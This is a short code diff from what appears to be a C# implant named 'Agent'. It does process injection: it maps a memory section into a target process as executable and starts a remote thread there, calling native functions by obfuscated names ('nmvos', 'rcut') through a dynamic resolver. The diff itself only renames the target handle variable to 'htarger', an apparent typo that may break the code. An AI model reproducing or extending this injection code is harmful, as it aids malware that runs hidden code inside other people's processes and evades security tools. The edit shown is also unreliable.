@@ -86,7 +86,7 @@ namespace Agent
             // create a remote view of the section in the target
             IntPtr pRemoteView = IntPtr.Zero;
             
-            object[] nmvosParams2 = new object[] { hSectionHandle, htarget, pRemoteView, UIntPtr.Zero, UIntPtr.Zero, offset, size, ViewUnmap, (UInt32)0, Native.MemoryProtection.PAGE_EXECUTE_READ };
+            object[] nmvosParams2 = new object[] { hSectionHandle, htarger, pRemoteView, UIntPtr.Zero, UIntPtr.Zero, offset, size, ViewUnmap, (UInt32)0, Native.MemoryProtection.PAGE_EXECUTE_READ };
             result = Generic.InvokeFunc<UInt32>(Resolver.GetFunc("nmvos"), typeof(nmpvosDelegate), ref nmvosParams2);
 
             pRemoteView = (nint)nmvosParams2[2];
@@ -95,7 +95,7 @@ namespace Agent
             IntPtr hThread = IntPtr.Zero;
             Native.CLIENT_ID cid = new Native.CLIENT_ID();
 
-            object[] rcutParams = new object[] { htarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, hThread, cid };
+            object[] rcutParams = new object[] { htarger, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, hThread, cid };
             var res = Generic.InvokeFunc<nint>(Resolver.GetFunc("rcut"), typeof(rcutDelegate), ref rcutParams);
 
             hThread = (nint)rcutParams[8];
